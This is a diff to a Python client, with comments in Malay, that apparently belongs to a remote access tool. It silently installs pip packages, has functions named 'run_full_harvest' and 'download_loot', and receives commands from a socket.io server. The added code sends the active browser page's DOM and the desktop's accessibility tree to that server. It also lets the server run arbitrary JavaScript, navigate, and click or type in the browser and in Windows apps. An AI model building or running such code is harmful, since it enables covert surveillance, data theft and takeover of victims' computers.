@@ -15,11 +15,12 @@ import subprocess
 # ============================================================
 def install_deps():
     pkgs = ["pillow", "python-socketio[client]", "requests", "websocket-client",
-            "pyautogui", "pynput", "pyperclip", "cryptography"]
+            "pyautogui", "pynput", "pyperclip", "cryptography", "uiautomation", "comtypes"]
     try:
         from PIL import ImageGrab
         import pyautogui, requests, socketio, pynput, pyperclip
         from cryptography.fernet import Fernet
+        import uiautomation
     except ImportError:
         subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet"] + pkgs,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -44,6 +45,12 @@ try:
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
+
+try:
+    import uiautomation as auto
+    UIA_AVAILABLE = True
+except ImportError:
+    UIA_AVAILABLE = False
 
 pyautogui.FAILSAFE = False
 
@@ -592,16 +599,75 @@ def run_full_harvest():
 # MODUL 3: PINCHTAB DOM EXTRACTOR
 # ============================================================
 def get_page_dom_context():
-    """Ekstrak DOM ringkas dari Chrome tab aktif via PinchTab/CDP."""
+    """Ekstrak DOM ringkas dengan CSS selectors yang boleh digunakan terus oleh AI."""
     dom_summary = ""
     
-    # Cuba PinchTab dulu
+    # Improved JS that generates usable CSS selectors for each element
+    dom_js = """
+(function() {
+  var elements = [];
+  var tags = ['a','button','input','select','textarea','video','img','h1','h2','h3','[role=button]','[role=link]','[role=search]','[role=textbox]'];
+  var seen = new Set();
+  tags.forEach(function(tag) {
+    document.querySelectorAll(tag).forEach(function(el, idx) {
+      var rect = el.getBoundingClientRect();
+      if (rect.width === 0 || rect.height === 0) return;
+      var obj = {tag: el.tagName.toLowerCase()};
+      
+      if (el.id) {
+        obj.selector = '#' + el.id;
+      } else if (el.name) {
+        obj.selector = el.tagName.toLowerCase() + '[name="' + el.name + '"]';
+      } else if (el.getAttribute('aria-label')) {
+        obj.selector = el.tagName.toLowerCase() + '[aria-label="' + el.getAttribute('aria-label') + '"]';
+      } else if (el.className && typeof el.className === 'string' && el.className.trim()) {
+        var cls = el.className.trim().split(/\s+/)[0];
+        obj.selector = el.tagName.toLowerCase() + '.' + cls;
+      } else if (el.getAttribute('data-testid')) {
+        obj.selector = '[data-testid="' + el.getAttribute('data-testid') + '"]';
+      } else {
+        obj.selector = el.tagName.toLowerCase() + ':nth-of-type(' + (idx+1) + ')';
+      }
+      
+      if (seen.has(obj.selector)) return;
+      seen.add(obj.selector);
+      
+      if (el.href) obj.href = el.href.substring(0,100);
+      if (el.type) obj.type = el.type;
+      if (el.placeholder) obj.placeholder = el.placeholder.substring(0,40);
+      obj.text = (el.innerText || el.value || el.placeholder || el.alt || el.title || '').substring(0,60).trim();
+      if (obj.text || obj.href || obj.type) elements.push(obj);
+    });
+  });
+  return JSON.stringify({
+    url: window.location.href,
+    title: document.title,
+    elements: elements.slice(0, 60)
+  });
+})();
+"""
+    
+    # Cuba PinchTab dulu (evaluate JS for richer DOM)
     if PINCHTAB_ACTIVE:
+        try:
+            resp = requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
+                                json={"expression": dom_js}, timeout=5)
+            if resp.status_code == 200:
+                result = resp.json()
+                if isinstance(result, dict) and result.get("result"):
+                    dom_summary = result["result"][:4000]
+                    return dom_summary
+                elif isinstance(result, str):
+                    return result[:4000]
+        except Exception:
+            pass
+        
+        # Fallback: simple PinchTab DOM endpoint
         try:
             resp = requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/dom", timeout=5)
             if resp.status_code == 200:
                 dom_data = resp.json()
-                dom_summary = json.dumps(dom_data, ensure_ascii=False)[:3000]
+                dom_summary = json.dumps(dom_data, ensure_ascii=False)[:4000]
                 return dom_summary
         except Exception:
             pass
@@ -609,41 +675,94 @@ def get_page_dom_context():
     # Fallback: CDP Runtime.evaluate
     if ws_cdp:
         try:
-            js_code = """
-(function() {
-  var elements = [];
-  var tags = ['a','button','input','select','textarea','h1','h2','h3','title'];
-  tags.forEach(function(tag) {
-    document.querySelectorAll(tag).forEach(function(el) {
-      var obj = {tag: tag};
-      if (el.id) obj.id = '#' + el.id;
-      if (el.className) obj.cls = '.' + el.className.split(' ')[0];
-      if (el.href) obj.href = el.href.substring(0,80);
-      if (el.name) obj.name = el.name;
-      if (el.type) obj.type = el.type;
-      obj.text = (el.innerText || el.value || el.placeholder || '').substring(0,60).trim();
-      if (obj.text || obj.href) elements.push(obj);
-    });
-  });
-  return JSON.stringify({
-    url: window.location.href,
-    title: document.title,
-    elements: elements.slice(0, 80)
-  });
-})();
-"""
-            send_cdp_command("Runtime.evaluate", {"expression": js_code, "returnByValue": True})
-            # Note: ws_cdp is sync — get response
+            send_cdp_command("Runtime.evaluate", {"expression": dom_js, "returnByValue": True})
             ws_cdp.settimeout(3)
             response_raw = ws_cdp.recv()
             resp_data = json.loads(response_raw)
             result = resp_data.get("result", {}).get("result", {}).get("value", "")
             if result:
-                dom_summary = result[:3000]
+                dom_summary = result[:4000]
         except Exception as e:
             print_log(f"CDP DOM extract failed: {e}")
     
     return dom_summary
+
+# ============================================================
+# MODUL 5: WINDOWS UI AUTOMATION (AX Tree — "DOM untuk Desktop")
+# ============================================================
+def get_desktop_ax_tree():
+    """Extract Accessibility Tree dari window aktif — 'DOM untuk desktop apps'.
+    Memberikan AI akses penuh ke semua elemen UI tanpa perlu Vision AI."""
+    if not UIA_AVAILABLE:
+        return ""
+    
+    try:
+        fg = auto.GetForegroundControl()
+        if not fg or not fg.Name:
+            return ""
+        
+        result = {
+            "type": "desktop_ax_tree",
+            "window": fg.Name[:80],
+            "class": fg.ClassName,
+            "elements": []
+        }
+        
+        def walk(control, depth=0, max_depth=4):
+            """Rekursif walk AX tree, kumpul elemen yang boleh diinteraksi."""
+            if depth > max_depth or len(result["elements"]) >= 60:
+                return
+            try:
+                children = control.GetChildren()
+            except Exception:
+                return
+            
+            for child in children:
+                try:
+                    ct = child.ControlTypeName  # Button, Edit, MenuItem, etc.
+                    name = (child.Name or "")[:60]
+                    aid = child.AutomationId or ""
+                    cname = child.ClassName or ""
+                    
+                    # Hanya ambil elemen yang boleh diinteraksi
+                    interactive_types = [
+                        "ButtonControl", "EditControl", "MenuItemControl",
+                        "ComboBoxControl", "CheckBoxControl", "RadioButtonControl",
+                        "TabItemControl", "ListItemControl", "TreeItemControl",
+                        "HyperlinkControl", "TextControl", "MenuBarControl",
+                        "ToolBarControl", "DataItemControl", "DocumentControl"
+                    ]
+                    
+                    is_interactive = ct in interactive_types
+                    has_identity = bool(name) or bool(aid)
+                    
+                    if is_interactive and has_identity:
+                        el = {
+                            "control": ct.replace("Control", ""),  # "Button", "Edit", etc.
+                            "name": name,
+                        }
+                        if aid:
+                            el["automation_id"] = aid
+                        
+                        # Build selector for AI
+                        if aid:
+                            el["selector"] = f"AutomationId:{aid}"
+                        elif name:
+                            el["selector"] = f"Name:{name}"
+                        
+                        result["elements"].append(el)
+                    
+                    # Recurse ke anak-anak
+                    walk(child, depth + 1)
+                except Exception:
+                    continue
+        
+        walk(fg)
+        return json.dumps(result, ensure_ascii=False)[:4000]
+    
+    except Exception as e:
+        print_log(f"AX Tree extract failed: {e}")
+        return ""
 
 # ============================================================
 # BROWSER CONTROL (PinchTab / CDP)
@@ -803,6 +922,16 @@ def request_dom():
     """Dashboard minta DOM context dari Chrome."""
     dom = get_page_dom_context()
     sio.emit("dom_context", {"dom": dom})
+
+@sio.event
+def request_ax_tree():
+    """Server minta AX Tree dari desktop window aktif."""
+    ax = get_desktop_ax_tree()
+    if ax:
+        sio.emit("ax_tree_context", {"ax_tree": ax})
+        print_log(f"AX Tree sent ({len(ax)} chars)")
+    else:
+        print_log("AX Tree: no UIA data available (window may not support it)")
 
 @sio.event
 def download_loot():
@@ -965,40 +1094,161 @@ def execute_json_command(data):
                 print_log("Chrome CDP not started yet. Starting lazily now...")
                 start_cdp_chrome()
                 
-            if PINCHTAB_ACTIVE:
-                pt_action = action.replace("pinchtab_", "")
-                if pt_action == "get_dom":
-                    dom = get_page_dom_context()
-                    sio.emit("dom_context", {"dom": dom})
-                elif pt_action == "js":
-                    code = data.get("code", "")
+            pt_action = action.replace("pinchtab_", "")
+            
+            if pt_action == "get_dom":
+                dom = get_page_dom_context()
+                sio.emit("dom_context", {"dom": dom})
+                return
+            
+            if pt_action == "click":
+                selector = data.get("selector", "")
+                # Try PinchTab first, then CDP
+                if PINCHTAB_ACTIVE:
+                    try:
+                        js_click = f"(function(){{ var el = document.querySelector('{selector}'); if(el){{ el.scrollIntoView({{block:'center'}}); el.click(); return 'clicked'; }} return 'not found'; }})()"
+                        requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
+                                      json={"expression": js_click}, timeout=5)
+                        print_log(f"PinchTab click: {selector}")
+                    except Exception as e:
+                        print_log(f"PinchTab click failed: {e}")
+                        if ws_cdp:
+                            send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{selector}').click();"})
+                elif ws_cdp:
+                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{selector}').click();"})
+                else:
+                    print_log(f"Cannot click selector: no browser control available")
+                return
+            
+            if pt_action == "type":
+                selector = data.get("selector", "")
+                text = data.get("text", "")
+                if PINCHTAB_ACTIVE:
+                    try:
+                        js_type = f"""(function(){{ var el = document.querySelector('{selector}'); if(el){{ el.scrollIntoView({{block:'center'}}); el.focus(); el.value = '{text}'; el.dispatchEvent(new Event('input', {{bubbles:true}})); el.dispatchEvent(new Event('change', {{bubbles:true}})); return 'typed'; }} return 'not found'; }})()"""
+                        requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
+                                      json={"expression": js_type}, timeout=5)
+                        print_log(f"PinchTab type: {selector} = {text}")
+                    except Exception as e:
+                        print_log(f"PinchTab type failed: {e}")
+                        if ws_cdp:
+                            js = f"var el=document.querySelector('{selector}'); el.value='{text}'; el.dispatchEvent(new Event('input',{{bubbles:true}}));"
+                            send_cdp_command("Runtime.evaluate", {"expression": js})
+                elif ws_cdp:
+                    js = f"var el=document.querySelector('{selector}'); el.value='{text}'; el.dispatchEvent(new Event('input',{{bubbles:true}}));"
+                    send_cdp_command("Runtime.evaluate", {"expression": js})
+                else:
+                    print_log(f"Cannot type in selector: no browser control available")
+                return
+            
+            if pt_action == "navigate":
+                url = data.get("url", "")
+                if PINCHTAB_ACTIVE:
+                    try:
+                        requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/navigate",
+                                      json={"url": url}, timeout=5)
+                    except Exception:
+                        if ws_cdp:
+                            send_cdp_command("Page.navigate", {"url": url})
+                        else:
+                            subprocess.Popen(f'start chrome "{url}"', shell=True)
+                elif ws_cdp:
+                    send_cdp_command("Page.navigate", {"url": url})
+                else:
+                    print_log(f"CDP offline. Opening URL as new tab: {url}")
+                    subprocess.Popen(f'start chrome "{url}"', shell=True)
+                return
+            
+            if pt_action == "js":
+                code = data.get("code", "")
+                if PINCHTAB_ACTIVE:
                     try:
                         requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
                                       json={"expression": code}, timeout=5)
                     except Exception:
-                        send_cdp_command("Runtime.evaluate", {"expression": code})
-                else:
+                        if ws_cdp:
+                            send_cdp_command("Runtime.evaluate", {"expression": code})
+                elif ws_cdp:
+                    send_cdp_command("Runtime.evaluate", {"expression": code})
+                return
+            
+            # Fallback for unknown pinchtab_ actions
+            if PINCHTAB_ACTIVE:
+                try:
                     requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/{pt_action}",
                                   json=data, timeout=5)
+                except Exception as e:
+                    print_log(f"PinchTab {pt_action} failed: {e}")
+            return
+
+        # ════════════════════════════════════════════════
+        # DESKTOP UI AUTOMATION ACTIONS (AX Tree)
+        # ════════════════════════════════════════════════
+        if action == "uia_click":
+            if not UIA_AVAILABLE:
+                print_log("UIA not available. Falling back to pyautogui.")
             else:
-                # CDP fallback
-                pt_action = action.replace("pinchtab_", "")
-                if pt_action == "navigate":
-                    if ws_cdp:
-                        send_cdp_command("Page.navigate", {"url": data.get("url")})
+                try:
+                    target_name = data.get("name", "")
+                    target_id = data.get("automation_id", "")
+                    fg = auto.GetForegroundControl()
+                    el = None
+                    
+                    if target_id:
+                        el = fg.Control(AutomationId=target_id, searchDepth=5)
+                    elif target_name:
+                        el = fg.Control(Name=target_name, searchDepth=5)
+                    
+                    if el and el.Exists(maxSearchSeconds=2):
+                        el.Click(simulateMove=True)
+                        print_log(f"UIA Click: {target_name or target_id}")
                     else:
-                        url = data.get("url")
-                        print_log(f"CDP offline. Opening URL as new tab in existing browser: {url}")
-                        subprocess.Popen(f'start chrome "{url}"', shell=True)
-                elif pt_action == "click" and ws_cdp:
-                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{data.get('selector')}').click();"})
-                elif pt_action == "type" and ws_cdp:
-                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{data.get('selector')}').value='{data.get('text')}';"})
-                elif pt_action == "js" and ws_cdp:
-                    send_cdp_command("Runtime.evaluate", {"expression": data.get("code", "")})
-                elif pt_action == "get_dom":
-                    dom = get_page_dom_context()
-                    sio.emit("dom_context", {"dom": dom})
+                        print_log(f"UIA Click: Element not found — {target_name or target_id}")
+                except Exception as e:
+                    print_log(f"UIA Click failed: {e}")
+            return
+        
+        if action == "uia_type":
+            if not UIA_AVAILABLE:
+                print_log("UIA not available. Falling back to pyautogui.")
+            else:
+                try:
+                    target_name = data.get("name", "")
+                    target_id = data.get("automation_id", "")
+                    text = data.get("text", "")
+                    fg = auto.GetForegroundControl()
+                    el = None
+                    
+                    if target_id:
+                        el = fg.EditControl(AutomationId=target_id, searchDepth=5)
+                    elif target_name:
+                        el = fg.EditControl(Name=target_name, searchDepth=5)
+                    else:
+                        # Fallback: cari mana-mana EditControl dalam window
+                        el = fg.EditControl(searchDepth=5)
+                    
+                    if el and el.Exists(maxSearchSeconds=2):
+                        el.SetFocus()
+                        try:
+                            # Cuba ValuePattern dulu (paling tepat)
+                            vp = el.GetValuePattern()
+                            vp.SetValue(text)
+                        except Exception:
+                            # Fallback: guna SendKeys
+                            el.SendKeys(text, interval=0.03)
+                        print_log(f"UIA Type: '{text}' → {target_name or target_id or 'auto-detected edit'}")
+                    else:
+                        print_log(f"UIA Type: Edit control not found — {target_name or target_id}")
+                        # Fallback ke pyautogui
+                        pyautogui.typewrite(str(text), interval=0.04)
+                except Exception as e:
+                    print_log(f"UIA Type failed: {e}, falling back to pyautogui")
+                    pyautogui.typewrite(str(data.get('text', '')), interval=0.04)
+            return
+        
+        if action == "uia_get_tree":
+            ax = get_desktop_ax_tree()
+            sio.emit("ax_tree_context", {"ax_tree": ax})
             return
 
         x_raw = data.get("x")
